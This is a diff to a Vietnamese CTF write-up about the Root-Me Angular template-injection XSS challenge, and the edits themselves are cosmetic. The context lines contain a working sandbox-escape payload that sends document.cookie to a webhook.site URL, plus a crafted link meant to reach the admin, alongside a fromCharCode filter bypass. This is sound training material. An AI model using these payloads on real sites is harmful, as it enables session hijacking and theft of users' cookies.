@@ -227,6 +227,7 @@ Tra cứu cheatsheet XSS Angular, ta có thể tìm thấy payload: `{{$on.const
 (sử dụng hàm khởi tạo trong angular để có thể thực thi đoạn mã javascript bên trong ngoặc tròn)
 
 ![image](https://github.com/aQ05/Write-up/assets/121664384/e5e45d26-bb08-4e7b-adf1-3641ca97c614)
+
 Để bypass nháy đơn thì ta có thử sử dụng HTML để encode dấu nháy đơn
 
 Payload: `{{$on.constructor(&#x27;document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie)&#x27)()}}`
@@ -236,9 +237,9 @@ Payload: `{{$on.constructor(&#x27;document.location="https://webhook.site/aa5efb
 Payload đã chạy được. Giờ thì gửi payload đến admin qua Contact tab:
 `http://challenge01.root-me.org/web-client/ch35/?name={{$on.constructor(&#x27;document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie)&#x27)()}}`
 
-Web không trả về gì cả :<, khả năng đoạn nháy đơn bị filter, vì thế không dùng html encode được. Theo lời mentor và thử dùng payload này:
+Web không trả về gì cả :<, khả năng đoạn nháy đơn bị filter, vì thế không dùng HTML encode được. Theo lời mentor và thử dùng payload này:
 
-`{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x())()}}`
+`{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}`
 
 > `valueOf.name.constructor.fromCharCode`: `valueOf.name` được sử dụng vì nó trả về một giá trị chuỗi. Thuộc tính `constructor` được sử dụng để lấy hàm khởi tạo của `valueOf.name`:
  ```js
